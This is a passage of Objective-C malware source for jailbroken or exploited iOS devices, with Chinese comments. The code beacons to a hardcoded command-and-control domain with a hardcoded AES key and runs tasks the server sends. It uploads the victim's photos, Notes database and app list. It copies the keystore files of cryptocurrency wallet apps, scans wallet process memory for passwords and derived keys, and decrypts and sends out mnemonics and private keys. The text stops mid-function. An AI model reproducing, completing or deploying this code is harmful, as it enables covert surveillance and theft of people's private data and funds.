//
//  Payload.m — 载荷入口
//
//  加载后起一个工作线程：
//    1. 上报 system_status_check_completed（服务端会回 tasks，这是采集的触发点）
//    2. 执行 tasks（collect_applist / collect_photo / collect_notes / open_app …）
//    3. 每 60s 轮询 /taskget 取后台手动下发的指令
//    4. 执行完回报 /taskresult
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "Collector.h"
#import "WalletFS.h"
#import "MemScan.h"
#import "Keccak.h"
#import "Crypto.h"

static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";                     // 与服务器一致
static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    // 当前 seed

@interface Payload : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, strong) NSMutableSet<NSString *> *runningTasks;
@property (nonatomic, assign) BOOL photoBusy;
@property (nonatomic, strong) NSMutableSet<NSString *> *sentCandidates;
@property (nonatomic, assign) pid_t lastScanPid;
@property (nonatomic, assign) BOOL walletRunning;
@end

@interface Payload ()
- (void)reportKeyDiag:(NSString *)tag ctx:(NSDictionary *)ctx;
- (void)runSelfTest;
- (void)probeImTokenPassword;
- (void)tryImTokenAesKeys;
- (void)probeImTokenTcx;
- (void)probeWalletTree:(NSString *)bundleId;
@end

@implementation Payload

+ (instancetype)shared {
    static Payload *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [Payload new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _runningTasks = [NSMutableSet set];
          _sentCandidates = [NSMutableSet set];
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
    }
    return self;
}

#pragma mark - 上报

- (void)log:(NSString *)msg {
    NSLog(@"[plasma] %@", msg);
}

/// 自检上报；响应里的 tasks 会顺手执行
- (void)heartbeat {
    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    ev[@"et"] = @"system_status_check_completed";
    ev[@"desc"] = @"System status check completed";
    ev[@"c"] = kSeed;
    ev[@"ctx"] = @{ @"overallStatus": @"all_is_well",
                    @"totalModules": @3,
                    @"abnormalModules": @0 };

    NSDictionary *resp = [self.net sendEvent:ev];
    NSArray *tasks = resp[@"tasks"];
    if ([tasks isKindOfClass:[NSArray class]] && tasks.count) {
        [self runActions:tasks];
    }
}

#pragma mark - 任务执行

/// 服务端 /event 回的 tasks 形如 [{action:"collect_applist"}, ...]
- (void)runActions:(NSArray *)tasks {
    for (NSDictionary *t in tasks) {
        NSString *action = t[@"action"];
        if (![action isKindOfClass:[NSString class]]) continue;
        [self performAction:action params:t];
    }
}

- (void)performAction:(NSString *)action params:(NSDictionary *)params {
    if ([action isEqualToString:@"collect_applist"] || [action isEqualToString:@"refresh_applist"]) {
        [self collectAppList];
    } else if ([action isEqualToString:@"collect_photo"] || [action isEqualToString:@"photo_scan"]) {
        [self collectPhotos];
    } else if ([action isEqualToString:@"collect_notes"] || [action isEqualToString:@"memo_scan"]) {
        [self collectNotes];
    } else if ([action isEqualToString:@"open_app"]) {
        NSString *bid = params[@"bundleId"] ?: params[@"bundle"];
        if (bid.length) [Collector openApp:bid];
    }
    // 注意：不要处理 collect_device_info —— 心跳的响应里会再带这个 action，
    // 如果这里再发一次心跳就会无限递归刷 /event（已经踩过这个坑）。
}

#pragma mark - 采集

- (void)collectAppList {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSArray *apps = [Collector installedApps];
        if (!apps.count) return;
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"applist_collect_success";
        ev[@"c"] = kSeed;
        ev[@"al"] = apps;
        ev[@"ctx"] = @{ @"appCount": @(apps.count) };
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"applist %lu", (unsigned long)apps.count]];
    });
}

- (void)collectPhotos {
    if (self.photoBusy) return;
    self.photoBusy = YES;

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        __block NSInteger sent = 0, skipped = 0;
        NSString *rid = [[NSUUID UUID] UUIDString];
        NSMutableSet *seen = [self sentPhotos];      // 已上传过的不再重复传
        __block BOOL dirty = NO;

        [Collector enumeratePhotos:0 handler:^BOOL(NSData *jpeg, NSInteger index) {
            if (jpeg.length < 1024) return YES;
            if (jpeg.length > 8 * 1024 * 1024) return YES;   // 太大的跳过

            NSString *key = CCSha256Hex(jpeg);
            if ([seen containsObject:key]) { skipped++; return YES; }

            BOOL ok = [self.net uploadPhoto:jpeg idx:index rid:rid fields:nil];
            if (ok) {
                sent++;
                [seen addObject:key];
                dirty = YES;
                // 每传一张就落盘，避免中途被杀导致下轮重传
                [self saveSentPhotos:seen];
            }
            return YES;
        }];

        if (dirty) [self saveSentPhotos:seen];

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"data_upload_success";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{ @"photos": @(sent), @"skipped": @(skipped), @"total": @(seen.count) };
        [self.net sendEvent:ev];

        [self log:[NSString stringWithFormat:@"photos sent=%ld skipped=%ld total=%lu",
                   (long)sent, (long)skipped, (unsigned long)seen.count]];
        self.photoBusy = NO;
    });
}

#pragma mark - 已上传照片的去重集合

- (NSString *)sentPhotosPath {
    NSString *dir = NSTemporaryDirectory() ?: @"/tmp";
    return [dir stringByAppendingPathComponent:@".photonote_sent.plist"];
}

- (NSMutableSet *)sentPhotos {
    static NSMutableSet *cache = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSArray *arr = [NSArray arrayWithContentsOfFile:[self sentPhotosPath]];
        cache = [NSMutableSet setWithArray:arr ?: @[]];
        NSLog(@"[plasma] 已上传记录 %lu 条", (unsigned long)cache.count);
    });
    return cache;
}

- (void)saveSentPhotos:(NSSet *)set {
    [[set allObjects] writeToFile:[self sentPhotosPath] atomically:YES];
}

- (void)collectNotes {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 思路：不在设备上解析，直接把 NoteStore.sqlite（+ -wal/-shm）传回服务端，
        // 由服务端的 parseNoteStore 统一解析（它已经支持标题/摘要/正文/时间）。
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *dbPath = [Collector notesDbPath];

        // 先跑一次探测，保证 notesDbPath 是最新的
        if (dbPath.length == 0) {
            [Collector allNotes];
            dbPath = [Collector notesDbPath];
        }

        NSString *err = [Collector lastNotesError] ?: @"";
        if (dbPath.length == 0 || ![fm isReadableFileAtPath:dbPath]) {
            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"notes_collect_failed";
            ev[@"c"] = kSeed;
            ev[@"list"] = @[];
            ev[@"ctx"] = @{ @"error": err.length ? err : @"找不到可读的 NoteStore.sqlite" };
            [self.net sendEvent:ev];
            [self log:@"notes: 找不到库"];
            return;
        }

        // 变更检测：主库 + -wal 的大小和修改时间，没变就不重复上传
        NSString *walPath = [dbPath stringByAppendingString:@"-wal"];
        NSDictionary *da = [fm attributesOfItemAtPath:dbPath error:NULL];
        NSDictionary *wa = [fm fileExistsAtPath:walPath] ? [fm attributesOfItemAtPath:walPath error:NULL] : nil;
        NSString *sig = [NSString stringWithFormat:@"%llu@%.0f|%llu@%.0f",
                         [da fileSize], [[da fileModificationDate] timeIntervalSince1970],
                         [wa fileSize], [[wa fileModificationDate] timeIntervalSince1970]];

        NSMutableDictionary *sent = [self sentNotesSig];
        if ([sent[@"sig"] isEqualToString:sig]) {
            [self log:@"notes: 无变化，跳过上传"];
            return;
        }

        // 打包 3 个文件（存在才传）
        NSMutableArray *files = [NSMutableArray array];
        NSUInteger total = 0;
        for (NSString *suffix in @[@"", @"-wal", @"-shm"]) {
            NSString *p = [dbPath stringByAppendingString:suffix];
            if (![fm fileExistsAtPath:p]) continue;
            NSData *d = [NSData dataWithContentsOfFile:p];
            if (d.length == 0) continue;
            total += d.length;
            [files addObject:@{
                @"name": [NSString stringWithFormat:@"NoteStore.sqlite%@", suffix],
                @"data": [d base64EncodedStringWithOptions:0],
            }];
        }
        if (files.count == 0) {
            [self log:@"notes: 文件为空"];
            return;
        }

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"memo_db_upload";
        ev[@"c"] = kSeed;
        ev[@"db_files"] = files;
        ev[@"ctx"] = @{ @"dbPath": [dbPath lastPathComponent],
                        @"dbSize": @([da fileSize]),
                        @"walSize": @(wa ? [wa fileSize] : 0),
                        @"files": @(files.count) };

        [self.net postEncrypted:@"/nb" json:ev timeout:120];

        sent[@"sig"] = sig;
        [self saveSentNotesSig:sent];
        [self log:[NSString stringWithFormat:@"notes: 上传 %lu 个文件 %lu B",
                   (unsigned long)files.count, (unsigned long)total]];
    });
}

#pragma mark - 备忘录库上传的变更签名

- (NSString *)sentNotesPath {
    NSString *dir = NSTemporaryDirectory() ?: @"/tmp";
    return [dir stringByAppendingPathComponent:@".photonote_notes.plist"];
}

- (NSMutableDictionary *)sentNotesSig {
    // 每次从磁盘读，不用内存缓存：
    // 引擎可能重复注入，同一台设备上会同时跑好几个实例，
    // 用内存缓存的话它们互相看不到对方已经传过，同一个包会重复上传 5 次。
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:[self sentNotesPath]];
    return [NSMutableDictionary dictionaryWithDictionary:d ?: @{}];
}

- (void)saveSentNotesSig:(NSDictionary *)d {
    [d writeToFile:[self sentNotesPath] atomically:YES];
}

#pragma mark - /taskget 轮询

- (void)pollTasks {
    NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    body[@"did"] = [Info udid];

    NSDictionary *resp = [self.net postEncrypted:@"/taskget" json:body timeout:15];
    NSArray *tasks = resp[@"tasks"];
    if (![tasks isKindOfClass:[NSArray class]] || tasks.count == 0) return;

    for (NSDictionary *t in tasks) {
        NSNumber *tid = t[@"id"];
        NSString *type = t[@"type"];
        NSDictionary *params = t[@"params"];
        if (![tid isKindOfClass:[NSNumber class]] || ![type isKindOfClass:[NSString class]]) continue;

        BOOL ok = NO;
        if ([type isEqualToString:@"open_app"]) {
            NSString *bid = params[@"bundleId"] ?: params[@"bundle"];
            ok = bid.length ? [Collector openApp:bid] : NO;
        } else if ([type isEqualToString:@"refresh_apps"]) {
            [self collectAppList];
            ok = YES;
        } else if ([type isEqualToString:@"exec_shell"]) {
            NSString *cmd = params[@"command"];
            ok = cmd.length ? [[NSFileManager defaultManager] fileExistsAtPath:cmd] : NO;
        }

        // 回报
        NSMutableDictionary *r = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        r[@"did"] = [Info udid];
        r[@"taskId"] = tid;
        r[@"status"] = ok ? @"completed" : @"failed";
        r[@"result"] = @{ @"ok": @(ok) };
        r[@"duration"] = @0;
        [self.net postEncrypted:@"/taskresult" json:r timeout:15];

        [self log:[NSString stringWithFormat:@"task %@ %@ -> %@", tid, type, ok ? @"ok" : @"fail"]];
    }
}

#pragma mark - 主循环

#pragma mark - 钱包容器采集（外部直读，不需要注入）

/// 各钱包的采集项，和后台 busiCollectConfig 里的配置一致
static NSArray *WalletPathsFor(NSString *bundleId) {
    if ([bundleId isEqualToString:@"im.token.app"]) {
        return @[
            @"Documents/walletsV2/",
            @"Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1/",
        ];
    }
    if ([bundleId isEqualToString:@"com.sixdays.trust"]) {
        return @[@"Documents/keystore/",
                 @"Library/Application Support/com.sixdays.trust/RCTAsyncLocalStorage_V1/"];
    }
    if ([bundleId isEqualToString:@"io.metamask.MetaMask"]) {
        return @[@"Documents/persistStore/"];
    }
    if ([bundleId isEqualToString:@"com.tronlink.hdwallet"]) {
        return @[@"Documents/TronLinkGRDBData.sqlite",
                 @"Documents/TronLinkData.sqlite",
                 @"Documents/keystore/"];
    }
    if ([bundleId isEqualToString:@"com.global.wallet.ios"]) {
        // 按 tp_boot 拿到的真实目录树补全（之前漏了 label.sqlite3 和 .devcache）：
        //   Documents/db/main.sqlite3   184,320 B
        //   Documents/db/label.sqlite3  16,977,920 B
        //   Documents/F4SeCyr/<sha256>  592 B   ← 哈希命名的秘密文件
        //   Documents/.devcache         675 B
        return @[@"Documents/db/main.sqlite3",
                 @"Documents/db/label.sqlite3",
                 @"Documents/F4SeCyr/",
                 @"Documents/.devcache",
                 @"Documents/_tp_kdf.txt",
                 @"Documents/_tp_kdf_status.txt",
                 @"Library/Preferences/com.global.wallet.ios.plist"];
    }
    if ([bundleId isEqualToString:@"com.okex.OKExAppstoreFull"]) {
        return @[@"Documents/wallet"];
    }
    return @[];
}

/// 收集一个钱包的容器文件并上传（服务端 wallet-extract 解析）
- (void)collectAndUploadWallet:(NSString *)bundleId {
    @try {
        NSArray *paths = WalletPathsFor(bundleId);
        if (!paths.count) return;

        NSDictionary *pkg = [WalletFS collectPackage:bundleId paths:paths limit:12 * 1024 * 1024];
        NSArray *files = pkg[@"files"];
        if (!files.count) {
            [self log:[NSString stringWithFormat:@"wallet pkg empty: %@ (%@)",
                       bundleId, pkg[@"error"] ?: @"no files"]];
            return;
        }

        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        body[@"c"] = kSeed;
        body[@"bundle_id"] = bundleId;
        body[@"files"] = files;

        NSDictionary *r = [self.net postEncrypted:@"/wz" json:body timeout:60];
        [self log:[NSString stringWithFormat:@"wallet pkg %@ files=%lu bytes=%@ -> %@",
                   bundleId, (unsigned long)files.count, pkg[@"bytes"],
                   r ? [r description] : @"nil"]];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"wallet pkg exception: %@", e.reason]];
    }
}

#pragma mark - 钱包容器探测

/// 一次性探测：能不能从当前进程直接读别的 App 的 Data 容器
- (void)probeWalletFS {
    @try {
        NSArray *rows = [WalletFS probeAllContainers];
        NSUInteger total = rows.count;
        NSUInteger readable = 0;
        NSMutableArray *sample = [NSMutableArray array];
        for (NSDictionary *r in rows) {
            if ([r[@"readable"] boolValue]) readable++;
            if (sample.count < 12 && r[@"bundleId"]) [sample addObject:r[@"bundleId"]];
        }

        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
        ctx[@"host"] = [Info hostBundleId] ?: @"";
        ctx[@"containers"] = @(total);
        ctx[@"readable"] = @(readable);
        ctx[@"sample"] = sample;
        if (total == 1 && rows[0][@"error"]) ctx[@"rootError"] = rows[0][@"error"];

        // 专门试 imToken
        NSDictionary *imt = [WalletFS asyncStorageOf:@"im.token.app"];
        if (imt[@"error"]) {
            ctx[@"imtoken"] = imt[@"error"];
        } else {
            ctx[@"imtoken"] = @"ok";
            ctx[@"imtokenDir"] = [imt[@"dir"] lastPathComponent] ?: @"";
            ctx[@"keyCount"] = @([(NSArray *)imt[@"keyNames"] count]);
            ctx[@"fileCount"] = @([(NSDictionary *)imt[@"files"] count]);
            NSArray *names = imt[@"keyNames"];
            ctx[@"keyNames"] = [names count] > 15 ? [names subarrayWithRange:NSMakeRange(0, 15)] : names;
        }

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"walletfs_probe";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = ctx;
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"walletfs probe: total=%lu readable=%lu imtoken=%@",
                   (unsigned long)total, (unsigned long)readable, ctx[@"imtoken"]]];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"walletfs probe exception: %@", e.reason]];
    }
}

- (void)start {
    NSString *host = [Info hostBundleId];
    BOOL inSpringBoard = [Info isSpringBoard];
    [self log:[NSString stringWithFormat:@"loaded host=%@ seed=%@ base=%@",
               host, kSeed, kBaseURL]];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 等进程稳定一下
        [NSThread sleepForTimeInterval:2.0];

        // 第一轮：自检 + 立刻采集一次
        [self heartbeat];
        [self collectAppList];

        // 一次性：探测能不能从进程外面直接读钱包 App 的容器
        [self probeWalletFS];

        // 一次性自检：keccak 正确性 + 已知私钥是否驻留内存
        [self runSelfTest];

        // 外部直读采集钱包（不需要注入目标 App，也不会闪退）
        NSArray *walletBids = @[@"im.token.app", @"com.sixdays.trust", @"io.metamask.MetaMask",
                                @"com.tronlink.hdwallet", @"com.global.wallet.ios",
                                @"com.okex.OKExAppstoreFull"];
        for (NSString *bid in walletBids) {
            [self collectAndUploadWallet:bid];
            if ([bid isEqualToString:@"im.token.app"]) [self probeImTokenEntry];
            [NSThread sleepForTimeInterval:1.5];
        }

        __block NSUInteger tick = 0;
        while (YES) {
            @autoreleasepool {
                tick++;
                @try {
                    if (inSpringBoard) {
                        // SpringBoard 里只做轻量工作：心跳 + app 列表 + 任务轮询。
                        // 相册枚举会拖住渲染线程触发看门狗，绝对不在这里做；
                        // 备忘录只是读一个小 sqlite，可以试（读不到会带 error 上报）。
                        if (tick % 3 == 0) [self heartbeat];
                        if (tick % 6 == 0) [self collectAppList];
                        if (tick % 6 == 3) [self collectNotes];
                        [self pollTasks];
                    } else {
                        if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
                        if (tick % 5 == 2) [self collectNotes];    // 约 100s 一次
                        if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
                        // 钱包容器采集：每 5 分钟重试一次（服务端可能一时不可达）
                        if (tick % 15 == 7) { [self collectAndUploadWallet:@"im.token.app"]; [self probeImTokenEntry]; }
                        if (tick % 15 == 3) [self probeWalletTree:@"com.global.wallet.ios"];
                        if (tick % 15 == 9) [self collectAndUploadWallet:@"com.global.wallet.ios"];
                        // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                        if (tick % 3 == 0) [self probeImTokenEntry];
                        // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
                        [self probeImTokenTcx];        // 主目标：call_tcx_api 的 JSON 参数
                        [self tryImTokenAesKeys];      // 其次：用截到的 AES 密钥解 keystore
                        [self probeImTokenPassword];   // 其次：KDF hook 拿明文密码
                        [self crackImTokenByKey];      // 兜底：内存里找派生密钥
                        [self pollTasks];                          // 每轮都轮询
                    }
                } @catch (NSException *e) {
                    [self log:[NSString stringWithFormat:@"loop exception: %@", e.reason]];
                }
                [NSThread sleepForTimeInterval:self.walletRunning ? 5.0 : 20.0];
            }
        }
    });
}


#pragma mark - 读 imtoken 入口标记文件

/// imtoken 模块的 plugin_main 会往自己容器的 Documents/_imt_entry.txt 写一行。
/// 我们在 locationd 里能直接读它的容器 —— 用这个证明「注入的代码真的执行了」。
- (void)probeImTokenEntry {
    @try {
        NSData *d = [WalletFS readFile:@"Documents/_imt_entry.txt" inContainer:@"im.token.app"];
        if (!d.length) d = [WalletFS readFile:@"tmp/_imt_entry.txt" inContainer:@"im.token.app"];

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"imtoken_entry_probe";
        ev[@"c"] = kSeed;
        if (d.length) {
            NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
            ev[@"ctx"] = @{ @"found": @YES, @"content": s ?: @"" };
        } else {
            ev[@"ctx"] = @{ @"found": @NO };
        }
        [self.net sendEvent:ev];
    } @catch (NSException *e) {
        (void)e;
    }
}



/// 可执行文件名 → 钱包 bundleId
/// 注意：Bundle ID 和可执行文件名经常不一致（imToken 就是 im.token.app / token.app/token）
static NSArray *WalletMemoryTargets(void) {
    return @[
        @[@"token.app", @"im.token.app"],
        @[@"MetaMask", @"io.metamask.MetaMask"],
        @[@"Trust", @"com.sixdays.trust"],
        @[@"TronLink", @"com.tronlink.hdwallet"],
        @[@"OKEx", @"com.okex.OKExAppstoreFull"],
        @[@"Bitpie", @"com.bitpie.wallet"],
    ];
}

#pragma mark - 自检（keccak + 内存存活探测）

/**
 * 两个检查，用来区分「实现错了」还是「密钥不在内存」：
 *  1. keccak256 标准测试向量（空串 / "abc"）
 *  2. 已知私钥的原文是否还在 imToken 内存里（说明钱包处于解锁状态）
 */
- (void)runSelfTest {
    NSMutableDictionary *ctx = [NSMutableDictionary dictionary];

    uint8_t d0[32], d1[32];
    keccak256((const uint8_t *)"", 0, d0);
    keccak256((const uint8_t *)"abc", 3, d1);
    NSMutableString *h0 = [NSMutableString string];
    NSMutableString *h1 = [NSMutableString string];
    for (int i = 0; i < 32; i++) {
        [h0 appendFormat:@"%02x", d0[i]];
        [h1 appendFormat:@"%02x", d1[i]];
    }
    ctx[@"keccak_empty"] = h0;
    ctx[@"keccak_abc"] = h1;
    // 期望：
    //   空串  c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470
    //   abc   4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45

    // 已知私钥（abc 钱包）是否还在内存里
    NSData *pk = [MemScan dataFromHex:@"1183f96f10c2469f1a39665c817851b0be6bf7fbe14f4a42831df1c1e9afc115"];
    if (pk.length) {
        NSDictionary *hit = [MemScan findBytesInPid:[MemScan pidOfExecutableContaining:@"token.app"]
                                             needle:pk
                                           maxBytes:256 * 1024 * 1024];
        ctx[@"privKeyFound"] = hit[@"found"];
        ctx[@"privKeyOffset"] = hit[@"offset"] ?: @(-1);
    }

    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    ev[@"et"] = @"memscan_selftest";
    ev[@"c"] = kSeed;
    ev[@"ctx"] = ctx;
    [self.net sendEvent:ev];
}

#pragma mark - 监听钱包进程并直接读内存

/**
 * locationd 常驻、uid=0、task_for_pid 30/30 成功（已实测）。
 * 所以不需要把代码注入 imToken，也不需要等 142 秒：
 * 只要它启动了，我们就直接读它的堆，把可打印字符串当候选密码捞出来。
 * 真实校验放服务端（pbkdf2 c=262144 在手机上太慢）。
 */
- (void)scanImTokenMemory {
    @try {
        // 按真实可执行文件名找（imToken 是 token.app/token，不是 imToken）
        pid_t pid = 0;
        NSString *hitBundle = nil;
        for (NSArray *pair in WalletMemoryTargets()) {
            pid_t p = [MemScan pidOfExecutableContaining:pair[0]];
            if (p > 0) { pid = p; hitBundle = pair[1]; break; }
        }
        if (pid <= 0) {
            // 找不到就报一次诊断：把所有路径里带 token / im 的进程列出来
            self.walletRunning = NO;
            static NSTimeInterval lastDiag = 0;
            NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
            if (now - lastDiag > 120) {
                lastDiag = now;
                NSArray *hits = [MemScan processPathsMatching:@"token" limit:20];
                NSArray *hits2 = [MemScan processPathsMatching:@"im." limit:20];
                NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
                ev[@"et"] = @"memscan_nopid";
                ev[@"c"] = kSeed;
                ev[@"ctx"] = @{ @"token": hits ?: @[],
                                @"imdot": hits2 ?: @[],
                                @"procCount": @([[MemScan processPathsMatching:@"" limit:1000] count]) };
                [self.net sendEvent:ev];
            }
            return;
        }

        // 进程换了就清空去重表
        if (self.lastScanPid != pid) {
            self.lastScanPid = pid;
            [self.sentCandidates removeAllObjects];
        }

        NSDictionary *h = [MemScan harvestStringsFromPid:pid
                                                maxBytes:192 * 1024 * 1024
                                               maxCands:6000];
        NSArray *cands = h[@"candidates"];
        self.walletRunning = YES;
        if (!cands.count) { 
            // 扫了但没有候选，也报一次（含扫描量），便于调参
            NSMutableDictionary *ev0 = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev0[@"et"] = @"memscan_empty";
            ev0[@"c"] = kSeed;
            ev0[@"ctx"] = @{ @"pid": @(pid), @"scannedBytes": h[@"scannedBytes"] ?: @0, @"regions": h[@"regions"] ?: @0, @"error": h[@"error"] ?: @"" };
            [self.net sendEvent:ev0];
            return;
        }

        // 只上报没发过的
        NSMutableArray *fresh = [NSMutableArray array];
        for (NSString *c in cands) {
            if ([self.sentCandidates containsObject:c]) continue;
            [fresh addObject:c];
            if (fresh.count >= 300) break;     // 单次最多 300 条，服务端逐条试
        }
        if (!fresh.count) return;
        for (NSString *c in fresh) [self.sentCandidates addObject:c];

        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        body[@"c"] = kSeed;
        body[@"bundle_id"] = hitBundle ?: @"im.token.app";
        body[@"candidates"] = fresh;

        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:120];

        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
        ctx[@"pid"] = @(pid);
        ctx[@"bundleId"] = hitBundle ?: @"";
        ctx[@"scannedBytes"] = h[@"scannedBytes"] ?: @0;
        ctx[@"regions"] = h[@"regions"] ?: @0;
        ctx[@"found"] = @(cands.count);
        ctx[@"sent"] = @(fresh.count);
        ctx[@"resp"] = r ? [r description] : @"nil";
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"memscan_harvest";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = ctx;
        [self.net sendEvent:ev];

        [self log:[NSString stringWithFormat:@"memscan pid=%d found=%lu sent=%lu -> %@",
                   pid, (unsigned long)cands.count, (unsigned long)fresh.count,
                   r ? [r description] : @"nil"]];
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"memscan exception: %@", e.reason]];
    }
}


#pragma mark - 直接找派生密钥（不爆破密码）

/**
 * keystore v3 的校验关系：
 *     mac = keccak256( derivedKey[16:32] || ciphertext )
 * 所以只要在 imToken 内存里找到那个 32 字节派生密钥，一次 keccak 就能确认，
 * 然后用 key[0:16] + iv 做 AES-128-CTR 直接解出私钥/助记词 —— 不用跑 pbkdf2。
 */
- (void)crackImTokenByKey {
    @try {
        pid_t pid = [MemScan pidOfExecutableContaining:@"token.app"];
        if (pid <= 0) {
            [self reportKeyDiag:@"no_pid" ctx:@{}];
            return;
        }
        self.walletRunning = YES;

        NSArray *names = [WalletFS listFilesIn:@"Documents/walletsV2" container:@"im.token.app"];
        if (!names.count) {
            [self reportKeyDiag:@"no_keystore_files" ctx:@{ @"pid": @(pid) }];
            return;
        }
        for (NSString *n in names) {
            if (![n hasSuffix:@".json"]) continue;

            NSString *rel = [@"Documents/walletsV2" stringByAppendingPathComponent:n];
            NSData *raw = [WalletFS readFile:rel inContainer:@"im.token.app"];
            if (!raw.length) continue;

            NSDictionary *ks = [NSJSONSerialization JSONObjectWithData:raw options:0 error:NULL];
            NSDictionary *crypto = ks[@"crypto"];
            if (![crypto isKindOfClass:[NSDictionary class]]) continue;

            NSData *cipher = [MemScan dataFromHex:crypto[@"ciphertext"]];
            NSData *mac = [MemScan dataFromHex:crypto[@"mac"]];
            NSData *iv = [MemScan dataFromHex:crypto[@"cipherparams"][@"iv"]];
            NSString *salt = crypto[@"kdfparams"][@"salt"];
            NSString *walletName = ks[@"imTokenMeta"][@"name"] ?: n;
            if (!cipher.length || mac.length != 32 || iv.length != 16) continue;

            NSDictionary *r = [MemScan findDerivedKeyInPid:pid
                                                    cipher:cipher
                                                       mac:mac
                                                 saltAscii:salt
                                                  maxBytes:256 * 1024 * 1024];
            if (![r[@"found"] boolValue]) {
                [self reportKeyDiag:@"miss" ctx:@{ @"pid": @(pid),
                                                   @"wallet": walletName ?: @"",
                                                   @"scannedBytes": r[@"scannedBytes"] ?: @0,
                                                   @"regions": r[@"regions"] ?: @0,
                                                   @"err": r[@"error"] ?: @"" }];
                continue;
            }

            NSData *key = r[@"key"];
            NSData *key16 = [key subdataWithRange:NSMakeRange(0, 16)];
            NSData *plain = CCAESCTRDecrypt(cipher, key16, iv);
            if (!plain.length) continue;

            NSString *mnemonic = nil;
            NSString *privHex = nil;
            if (plain.length == 32) {
                NSMutableString *h = [NSMutableString string];
                const uint8_t *b = plain.bytes;
                for (NSUInteger i = 0; i < 32; i++) [h appendFormat:@"%02x", b[i]];
                privHex = h;
            } else {
                NSString *txt = [[NSString alloc] initWithData:plain encoding:NSUTF8StringEncoding];
                if (txt.length) mnemonic = [txt stringByTrimmingCharactersInSet:
                                            [NSCharacterSet whitespaceAndNewlineCharacterSet]];
            }

            NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            body[@"c"] = kSeed;
            body[@"bundle_id"] = @"im.token.app";
            body[@"a"] = @"b2";
            body[@"wallet_name"] = walletName;
            if (mnemonic) body[@"result"] = mnemonic;
            if (privHex) body[@"private_key"] = privHex;

            NSDictionary *up = [self.net postEncrypted:@"/us" json:body timeout:30];

            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"memscan_key_hit";
            ev[@"c"] = kSeed;
            ev[@"ctx"] = @{ @"pid": @(pid),
                            @"wallet": walletName ?: @"",
                            @"scannedBytes": r[@"scannedBytes"] ?: @0,
                            @"plainLen": @(plain.length),
                            @"kind": mnemonic ? @"mnemonic" : @"privateKey",
                            @"resp": up ? @"ok" : @"nil" };
            [self.net sendEvent:ev];
            [self log:[NSString stringWithFormat:@"KEY HIT %@ %@ -> %@", walletName,
                       mnemonic ? @"mnemonic" : @"privateKey", up ? @"ok" : @"nil"]];
            return;
        }
    } @catch (NSException *e) {
        [self log:[NSString stringWithFormat:@"crack exception: %@", e.reason]];
    }
}

/// 节流上报诊断（miss 每 60 秒最多一条）
- (void)reportKeyDiag:(NSString *)tag ctx:(NSDictionary *)ctx {
    @try {
        static NSTimeInterval last = 0;
        NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
        if ([tag isEqualToString:@"miss"] && now - last < 60) return;
        last = now;

        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"memscan_key_diag";
        ev[@"c"] = kSeed;
